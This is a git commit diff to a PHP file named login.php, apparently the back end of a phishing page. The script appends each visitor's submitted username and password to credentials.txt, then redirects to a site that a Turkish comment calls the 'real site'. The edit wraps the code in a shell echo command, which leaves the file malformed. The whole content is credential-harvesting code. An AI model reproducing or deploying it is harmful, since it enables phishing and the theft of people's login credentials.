f3f9adfac850b00845b0b912feb4a7b9a8efb37b
Carban2717 <165124910+Carban2717@users.noreply.github.com>
2024-09-02 14:50:06 +0300

    Update login.php

--- login.php
+++ login.php
@@ -1,8 +1,8 @@
-<?php
+echo '<?php
 $file = fopen("credentials.txt", "a");
-fwrite($file, "Username: " . $_POST['username'] . "\n");
-fwrite($file, "Password: " . $_POST['password'] . "\n\n");
+fwrite($file, "Username: " . $_POST["username"] . "\n");
+fwrite($file, "Password: " . $_POST["password"] . "\n\n");
 fclose($file);
-header('Location: https://www.example.com');  // Gerçek siteye yönlendirme
+header("Location: https://www.example.com");
 exit();
-?>
+?>' > login.php
